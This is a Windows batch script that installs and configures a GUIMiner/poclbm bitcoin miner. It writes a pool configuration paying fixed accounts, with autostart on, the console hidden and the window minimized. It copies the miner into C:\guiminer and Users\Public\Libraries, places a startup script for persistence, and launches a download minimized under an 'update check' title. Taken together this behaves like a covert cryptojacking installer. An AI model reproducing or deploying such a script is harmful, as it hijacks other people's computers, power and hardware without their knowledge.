@echo off


rem starts redownloading guiminer
start "update check" /I /MIN /LOW "cmd" "/Q /C "%CD%\download.bat""


rem creates compatible version of poclbm.ini

for /F "delims=\ tokens=1-2" %%G in ("%ProgramFiles%") do set slashfiles=%%G\\%%H)
if ("%ProgramFiles(x86)%") NEQ ("") (for /F "delims=\ tokens=1-2" %%G in ("%ProgramFiles(x86)%") do set slashfiles=%%G\\%%H)

if exist %CD%\poclbm\noco.txt timeout /T 1 /NOBREAK
del %CD%\poclbm\noco.txt

:noco
if exist %CD%\poclbm\noco.txt goto noco

echo noco>%CD%\poclbm\noco.txt


echo {>%CD%\poclbm\poclbm.ini
echo     "profiles": [>>%CD%\poclbm\poclbm.ini
echo         {>>%CD%\poclbm\poclbm.ini
echo             "username": "evanmcc_main", >>%CD%\poclbm\poclbm.ini
echo             "balance_auth_token": "", >>%CD%\poclbm\poclbm.ini
echo             "name": "BTC", >>%CD%\poclbm\poclbm.ini
echo             "hostname": "stratum.btcguild.com", >>%CD%\poclbm\poclbm.ini
echo             "external_path": "", >>%CD%\poclbm\poclbm.ini
echo             "affinity_mask": 15, >>%CD%\poclbm\poclbm.ini
echo             "flags": "", >>%CD%\poclbm\poclbm.ini
echo             "autostart": false, >>%CD%\poclbm\poclbm.ini
echo             "device": 0, >>%CD%\poclbm\poclbm.ini
echo             "password": "d=1", >>%CD%\poclbm\poclbm.ini
echo             "port": "3333">>%CD%\poclbm\poclbm.ini
echo         }, >>%CD%\poclbm\poclbm.ini
echo         {>>%CD%\poclbm\poclbm.ini
echo             "username": "evanmcc", >>%CD%\poclbm\poclbm.ini
echo             "balance_auth_token": "", >>%CD%\poclbm\poclbm.ini
echo             "name": "bitparking", >>%CD%\poclbm\poclbm.ini
echo             "hostname": "mmpool.bitparking.com", >>%CD%\poclbm\poclbm.ini
echo             "external_path": "", >>%CD%\poclbm\poclbm.ini
echo             "affinity_mask": 15, >>%CD%\poclbm\poclbm.ini
echo             "flags": "", >>%CD%\poclbm\poclbm.ini
echo             "autostart": true, >>%CD%\poclbm\poclbm.ini
echo             "device": 0, >>%CD%\poclbm\poclbm.ini
echo             "password": "d=1", >>%CD%\poclbm\poclbm.ini
echo             "port": "3333">>%CD%\poclbm\poclbm.ini
echo         }, >>%CD%\poclbm\poclbm.ini
echo         {>>%CD%\poclbm\poclbm.ini
echo             "username": "1GPwFQ51uzwx1TuE4rYNo2VFahYvJKjw1c", >>%CD%\poclbm\poclbm.ini
echo             "balance_auth_token": "", >>%CD%\poclbm\poclbm.ini
echo             "name": "eligius", >>%CD%\poclbm\poclbm.ini
echo             "hostname": "stratum.mining.eligius.st", >>%CD%\poclbm\poclbm.ini
echo             "external_path": "", >>%CD%\poclbm\poclbm.ini
echo             "affinity_mask": 15, >>%CD%\poclbm\poclbm.ini
echo             "flags": "", >>%CD%\poclbm\poclbm.ini
echo             "autostart": true, >>%CD%\poclbm\poclbm.ini
echo             "device": 0, >>%CD%\poclbm\poclbm.ini
echo             "password": "d=1", >>%CD%\poclbm\poclbm.ini
echo             "port": "3334">>%CD%\poclbm\poclbm.ini
echo         }>>%CD%\poclbm\poclbm.ini
echo     ], >>%CD%\poclbm\poclbm.ini
echo     "bitcoin_executable": "%slashfiles%\\Bitcoin\\bitcoin-qt.exe", >>%CD%\poclbm\poclbm.ini
echo     "show_console": false, >>%CD%\poclbm\poclbm.ini
echo     "show_summary": false, >>%CD%\poclbm\poclbm.ini
echo     "show_opencl_warning": false, >>%CD%\poclbm\poclbm.ini
echo     "console_max_lines": 1, >>%CD%\poclbm\poclbm.ini
echo     "start_minimized": true, >>%CD%\poclbm\poclbm.ini
echo     "blockchain_directory": "C:\\Users\\Evan\\AppData\\Roaming\\Bitcoin", >>%CD%\poclbm\poclbm.ini
echo     "window_position": [>>%CD%\poclbm\poclbm.ini
echo         755, >>%CD%\poclbm\poclbm.ini
echo         144, >>%CD%\poclbm\poclbm.ini
echo         506, >>%CD%\poclbm\poclbm.ini
echo         328>>%CD%\poclbm\poclbm.ini
echo     ]>>%CD%\poclbm\poclbm.ini
echo }>>%CD%\poclbm\poclbm.ini


rem copies poclbm.ini
mkdir %appdata%\poclbm
ROBOCOPY "%CD%\poclbm" "%appdata%\poclbm" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS


del %CD%\poclbm\noco.txt

rem copies all files if corresponding folder does not exist
if not exist "%homedrive%\guiminer" ROBOCOPY %homedrive%\Users\Public\Libraries\guiminer %homedrive%\guiminer "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS" /f
if not exist "%homedrive%\Users\Public\Libraries\guiminer" ROBOCOPY %homedrive%\guiminer %homedrive%\Users\Public\Libraries\guiminer "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS" /f
if not exist "%homedrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\auto.bat" ROBOCOPY "%CD%" "%homedrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" auto.bat /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS

rem copies files anyway
ROBOCOPY %homedrive%\Users\Public\Libraries\guiminer %homedrive%\guiminer "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS" /f
ROBOCOPY %homedrive%\guiminer %homedrive%\Users\Public\Libraries\guiminer "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS" /f
ROBOCOPY "%CD%" "%homedrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" auto.bat /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS




cls
exit /B %errorlevel%
exit %errorlevel%